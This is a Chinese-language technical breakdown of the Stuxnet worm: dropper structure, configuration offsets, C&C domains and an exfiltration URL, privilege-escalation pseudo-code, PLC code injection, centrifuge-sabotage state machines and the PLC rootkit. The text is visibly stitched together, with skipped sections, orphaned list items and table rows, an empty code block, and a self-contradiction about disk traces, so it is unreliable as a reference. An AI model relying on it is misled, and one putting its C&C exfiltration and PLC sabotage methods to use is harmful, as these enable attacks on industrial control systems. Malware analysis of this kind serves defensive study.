Stuxnet 是**模块化、多组件、高度集成**的工业级恶意蠕虫，整体采用"**外壳包装器+核心DLL+嵌入式资源+双Rootkit**"的分层架构，所有攻击能力均打包在单一可执行文件中，无需外部依赖即可完成从植入、传播、提权到PLC破坏的全流程。其构造复杂度远超同期普通恶意软件，体现了国家级攻击的工程化水平。

本文完全基于赛门铁克官方分析文档，从**二进制封装、主DLL调度、内存递归传递、内核Rootkit、PLC代码篡改、状态机逻辑**等维度，深入代码底层拆解 Stuxnet 架构，并补充完整结构化技术清单与组件风险评级。

## 一、执行摘要
Stuxnet 是由国家级力量开发的**定向工业网络武器**，核心目标为伊朗纳坦兹核设施的铀浓缩离心机控制系统。它利用**4个Windows零日漏洞（CVE-2010-2568/CVE-2010-2729/CVE-2010-2743/CVE-2010-3338）**、**1个公开高危漏洞（CVE-2008-4250）**、**2个被盗数字证书**，突破物理隔离内网，篡改**西门子S7-315-2型PLC**程序，通过异常调速造成离心机物理损坏。截至2010年9月，全球约10万台主机被感染，其中伊朗占比58.31%，直接导致伊朗核计划推迟至少2年。

Stuxnet 首次实现了**虚拟网络攻击到物理设备破坏**的跨越，其架构设计完全针对工控环境的"物理隔离、无外网、依赖U盘和工控项目文件"等特点量身定制，是工业网络战的里程碑式事件。

## 二、整体架构：三层嵌套式设计
Stuxnet 采用**无磁盘依赖的纯内存运行架构**，核心是一个**约500KB的主DLL**，外部由一个**dropper（PE 投放器）** 包装，所有组件均存储在dropper的`.stub`节中，通过自定义 `.stub` 节实现组件递归传递，形成三层嵌套结构：

```
Dropper.exe（唯一磁盘可执行文件）
└── .stub 节（AES+XOR加密存储所有核心组件）
    ├── 主DLL（500KB，核心控制逻辑，32个导出函数）
    ├── 双加密配置块（全局控制参数+感染日志）
    └── 25个嵌入式资源（漏洞/驱动/模板/PLC攻击载荷）
```

### 1. Dropper 投放器
Dropper 是 Stuxnet 唯一需要落地的磁盘文件，其核心设计目标是**最小化磁盘痕迹**并实现组件的全生命周期传递：
1. 触发执行：用户双击、LNK漏洞自动执行或Autorun.inf触发后，Dropper 首先解密自身的`.stub`节
2. 内存加载：将主DLL直接映射到内存，不写入磁盘
3. **递归传递机制**（核心创新）：
   - 调用主DLL导出函数时，强制把 `.stub` 节的内存指针作为唯一入参传递
   - 被调用的导出函数会再次从传入的 `.stub` 指针提取所需组件，调用下一个导出函数
   - 全生命周期递归传递，**任何注入的进程/线程都能直接访问全部核心组件，无需读写磁盘**

- 执行流程：Dropper → 解密.stub节 → 内存映射主DLL → 调用主DLL的**Export15（唯一初始化入口）**
- **Export15 初始化执行流程**：
  1. 系统检查：仅运行32位Windows（2K/XP/2003/Vista/7/2008/2008 R2），64位系统直接退出
  2. 版本校验：对比磁盘加密存储的版本与内存版本，确保运行最新代码
  3. 提权判断：无管理员权限则触发对应零日提权漏洞
  4. 注入选型：扫描已安装的11款主流杀毒软件，动态选择最优注入目标进程
  5. 转交控制权：调用Export16进入主安装流程

##### （1）配置数据块（M1-6）深度解析
配置块是 Stuxnet 的**全局指令寄存器**，采用"**固定头+动态追加**"设计，全程**XOR 0xFF**加密存储，所有攻击行为由配置块硬编码控制，无任何外部配置文件依赖：
```
配置块 = 基础控制头(744B) + 计算机描述块(动态增长，无上限)
```

##### （2）基础控制头（硬编码核心参数）
| 偏移量 | 类型   | 参数值               | 说明                                   |
| ---- | ---- | ------------------ | ------------------------------------ |
| 0x8C | QWORD| 2012-06-24         | 全局截止日期，超期所有代码停止执行并自毁           |
| 0x78 | DWORD| 21天               | U盘感染有效期，超过后停止U盘传播                |
| 0x80 | DWORD| 3个                | U盘感染所需最少文件数，避免感染空U盘              |
| 0x84 | DWORD| 5MB                | U盘感染所需最少空闲空间                        |
| 0x1CC| CHAR[128]| mypremierfutbol.com | 主C&C服务器域名                           |
| 0x2CC| CHAR[128]| todaysfutbol.com   | 备用C&C服务器域名                          |
| 0x10 | DWORD| 版本号              | 用于内网P2P版本比较                          |


##### （3）计算机描述块（感染溯源核心）
每次新感染时自动追加到配置块末尾，格式固定，**每感染一台主机就追加一条记录**，因此配置块大小会随着传播链延长而不断增长：
```
[OS主版本].[OS次版本]-[全局标志]-[域类型]-[感染时间]-[内外网IP]-[计算机名]-[域名]-[感染的Step7项目路径]
```
- 字段详细说明：
  - `OS主版本.OS次版本`：例如`5.1`代表Windows XP，`6.1`代表Windows 7
  - `全局标志`：3位二进制标志位，记录系统是否安装Step7/WinCC、是否有管理员权限等
  - `域类型`：0代表工作组，1代表域环境
  - `感染时间`：格式为`YYYY/MM/DD-HH:MM:SS`
  - `内外网IP`：最多记录3个网卡的IP地址
  - `感染的Step7项目路径`：记录该主机上被感染的.s7p/.mcp文件路径

- 溯源价值：赛门铁克通过分析全球3280个样本中的计算机描述块，成功溯源到**伊朗5家初始目标机构**和**10条独立感染链**，精确还原了从2009年6月到2010年7月整个攻击的传播路径和时间线。

### 补充说明
1. **存储位置**：配置块加密存储在`%SystemRoot%\inf\mdmcpq3.PNF`文件中，同时在主DLL的`.stub`节中保留一份副本，运行时以内存中的副本为准

#### （1）双零日提权代码
为确保获得SYSTEM权限，Stuxnet内置两个零日提权漏洞，根据系统版本自动选择：
```c
// 提权逻辑代码片段
if (IsWindowsXPOrWindows2000()) {
    // 加载Resource250，触发CVE-2010-2743（MS10-073）Win32k.sys漏洞
    Exploit_Win32k_KeyboardLayout(); 
    // 注入csrss.exe进程，获得SYSTEM权限
} else {
    // 触发CVE-2010-3338（MS10-092）任务计划程序零日漏洞
    Exploit_TaskScheduler_Elevation(); 
    // 创建新的SYSTEM权限进程
}
```
- **CVE-2010-2743（MS10-073，Win32k.sys）**：利用键盘布局文件解析漏洞，通过畸形键盘布局文件触发越权执行
- **CVE-2010-3338（MS10-092，任务计划程序）**：未公开零日漏洞，2010年10月微软发布补丁

1. 提取Resource210的通用PE模板，添加一个名为`.verif`的新节

- 提前挂钩Ntdll.dll的`ZwOpenFile`、`ZwMapViewOfSection`等底层函数

只有同时满足以下两个条件的PLC才会被攻击：
1. PLC型号为`6ES7-315-2`（S7-300系列中端PLC）
2. 系统数据块SDB中包含**至少33个变频器识别码**（7050h对应伊朗Fararo Paya变频器，9500h对应芬兰Vacon变频器）

#### （2）代码篡改步骤
1. **DP_RECV替换**：将标准Profibus接收函数`DP_RECV`备份到FC1869，替换为恶意版本，拦截所有变频器的状态数据
2. **OB块感染**：采用**代码前置法**感染OB1（主循环）和OB35（看门狗）：

   - 将原OB块的代码追加到恶意代码之后
   - 效果：每次PLC循环先执行Stuxnet代码，再执行正常代码
3. **注入恶意代码块**：将15个自定义功能块（FC）和数据块（DB）写入PLC

#### （3）5状态攻击状态机
Stuxnet通过5状态有限状态机控制完整的攻击周期：
```
状态1（监控）→ 状态2（等待2小时）→ 状态3（第一波攻击）→ 状态4（第二波攻击）→ 状态5（重置）
```
- **状态1（监控）**：持续监控变频器的运行频率，要求在807-1210Hz之间（伊朗IR-1离心机的正常转速范围），累计12.8天的有效事件后进入状态2
- **状态2（等待）**：等待2小时，确认系统处于稳定运行状态，避免攻击过早暴露
- **状态3（第一波攻击）**：持续15分钟，向变频器发送指令，将转速提升至1410Hz（超速）
- **状态4（第二波攻击）**：持续50分钟，先将转速降至2Hz（失速），再提升至1064Hz
- **状态5（重置）**：重置所有计数器和状态变量，返回状态1，准备下一轮攻击

```asm
; 以下是原OB1的正常代码
...
```
- `0xDEADF007`是Stuxnet的标志性魔法值，用于标记PLC已被感染

#### （5）WinCC监控数据伪造机制
为防止操作员发现异常，Stuxnet通过挂钩PLC变量读写API实现数据伪造：

| A3-2 | 8状态攻击状态机 | 大规模集群破坏控制 | 无 | PLC内部执行 | 状态0（等待35天）→状态1（记录21秒系统数据）→状态2-6（集群破坏）→状态7（重置） | 极高 |
| A3-3 | 集群式破坏模块 | 单PLC控制984台设备 | 无 | PLC外围输出控制 | 将164台设备划分为15个集群；随机选择67%的设备进行破坏 | 极高 |

#### （1）代码缺陷与未激活原因
赛门铁克逆向发现，生成关键数据块DB8061的函数`GenerateDB8061()`中存在一个**空指针引用错误**：
```c
// 错误代码片段
PDB8061 pDB = NULL;
pDB->version = 1; // 空指针引用，抛出Windows异常
```
该异常被上层的`try-catch`块捕获，导致后续修改OB1主程序入口的代码永远不会执行。这一缺陷更可能是**开发进度未跟上攻击时间表**，而非技术能力不足——Sequence C的其他代码模块（8状态机、集群破坏逻辑）均已完成且逻辑严谨。

#### （2）8状态攻击状态机
Sequence C设计了更复杂的8状态机，用于大规模集群破坏：
```
状态0（等待）→ 状态1（记录）→ 状态2-6（集群破坏）→ 状态7（重置）
```
- **状态0（等待）**：监控6组共984台外围设备的运行时间，要求所有组至少运行3天，单组运行超过35天或总运行时间超过297天
- **状态1（记录）**：以1秒间隔连续记录21秒的PLC输入映像区数据，获取系统正常运行基准
- **状态2-6（集群破坏）**：将每组164台设备划分为15个集群，随机选择110台进行破坏，持续约7分钟
- **状态7（重置）**：删除所有动态创建的数据块，重置状态变量，返回状态1

#### （3）其他已知代码缺陷
- Windows 7 x64系统兼容性问题：Stuxnet会直接退出，无法感染
- 某些版本的Step7 v5.4 SP5下，DLL预加载漏洞可能失效
- 内网P2P更新时，极端情况下会出现版本回退问题

### 4. PLC Rootkit（全球首个）
恶意`s7otbxdx.dll`同时实现了**全球首个PLC级Rootkit**，确保操作员无法发现PLC代码被篡改：
- **读请求拦截**：
  - 读取OB1/OB35时，返回未感染的原始代码
  - 读取Stuxnet的恶意代码块时，返回"块不存在"错误
  - 读取DP_RECV时，返回保存在FC1869的原始代码
- **写请求拦截**：
  - 写入OB1/OB35时，自动在新代码前注入恶意代码
  - 写入DP_RECV时，重定向到FC1869，阻止覆盖恶意版本
- **枚举拦截**：枚举PLC代码块时，自动跳过所有Stuxnet的自定义代码块
- **效果**：即使操作员使用Step7软件连接PLC并上传代码，也看不到任何恶意代码

## 六、C&C通信模块
Stuxnet 采用**HTTP协议+双重XOR加密**的隐蔽通信方式，同时支持外网C&C和内网P2P双模式，适应工控环境的网络特点。

### 结构化技术清单
| 组件ID | 组件名称 | 核心功能 | CVE编号 | 攻击向量 | 技术实现要点 | 风险等级 |
|--------|----------|----------|---------|----------|--------------|----------|
| C1-1 | 外网C&C客户端 | 与远程服务器通信 | 无 | 80端口HTTP通信 | 伪装成正常网页请求；发送加密的系统信息与工控软件安装状态 | 高 |
| C1-2 | 数据加密模块 | 通信数据加密 | 无 | 数据加密 | 客户端发送：双重XOR加密+十六进制编码；服务器响应：31字节固定密钥XOR | 中 |
| C1-3 | 远程命令执行模块 | 接收并执行攻击者指令 | 无 | C&C服务器指令 | 支持加载执行任意代码；支持通过RPC在其他进程执行代码 | 高 |
| C1-4 | 内网RPC服务器 | 局域网P2P通信 | 无 | 135端口RPC通信 | 支持TCP与命名管道两种传输方式；实现内网版本自动同步 | 高 |

### 1. 外网C&C通信
- 通信端口：80端口，伪装成正常HTTP网页请求，绕过大多数防火墙
- 发送数据：加密的系统信息，包括：
  - OS版本、计算机名、域名、内外网IP地址
  - 关键标志位：是否安装西门子Step7/WinCC软件
- 加密方式：
  - 客户端发送：先XOR 0xFF，再用31字节固定密钥二次XOR，最后转为十六进制字符串
  - 服务器响应：用另一个31字节固定密钥XOR解密
- 传输格式：通过URL参数`data=xxx`传输加密数据，例如：
  ```
  http://www.mypremierfutbol.com/index.php?data=1234567890ABCDEF...
  ```
- 支持命令：
  - 命令0：在当前进程加载并执行任意代码
  - 命令1：通过RPC在局域网内其他进程执行任意代码

### 2. 内网P2P通信
- 基于微软RPC协议，支持TCP（135端口）和命名管道两种传输方式
- 核心功能：局域网内版本自动同步，解决工控内网主机无法连接外网的问题
- 工作机制：
  - 每台感染主机启动RPC服务器，监听连接请求
  - 低版本主机向高版本主机请求最新代码
  - 高版本主机主动向低版本主机推送更新
- 设计优势：即使所有外网C&C服务器被关闭，Stuxnet仍能在内网中持续传播和更新

## 八、代码架构核心创新点
Stuxnet的革命性在于它**重新定义了恶意软件的架构范式**，其代码级创新至今仍被后续工业恶意软件借鉴：
1. **纯内存递归传递架构**：全球首个实现`.stub`节全生命周期递归传递的恶意软件，所有组件全程内存运行，磁盘无任何可执行文件残留，彻底规避传统文件监控。
2. **双Rootkit协同隐匿**：首次实现**Windows内核Rootkit + PLC固件Rootkit**的全栈隐匿，从操作系统内核到工业控制器固件，实现代码和数据的双重伪造。
3. **无外网闭环攻击链**：U盘+内网P2P+工控项目的传播组合，首次实现对**完全物理隔离内网**的全流程攻击，无需任何外网连接即可完成植入、扩散、破坏。
4. **导出函数驱动的模块化设计**：32个导出函数完全解耦，每个功能独立封装，可单独升级替换，无需重新编译整个蠕虫，体现了国家级武器的工程化水平。
5. **PLC固件级代码篡改**：全球首个实现对工业控制器PLC的代码注入和Rootkit隐匿，首次证明虚拟网络攻击可以造成物理设备的永久性损坏。
